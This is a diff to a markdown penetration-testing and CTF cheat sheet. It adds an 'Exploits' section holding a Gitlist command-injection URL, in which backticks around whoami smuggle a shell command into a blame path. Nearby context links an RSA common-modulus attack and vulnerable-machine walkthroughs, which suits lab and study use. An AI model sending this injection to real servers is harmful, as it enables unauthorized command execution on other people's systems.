@@ -350,6 +350,13 @@ searchsploit postgreesql
 ### Common Modulus attack with extended Euclidean algorithm: [here](https://blog.0daylabs.com/2015/01/17/rsa-common-modulus-attack-extended-euclidean-algorithm/)
 
 
+### Exploits
+
+#### Gitlist
+```bash
+http://localhost/gitlist/my_repo.git/blame/master/""`whoami`
+```
+
 ## WalkThroughs
 
  - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
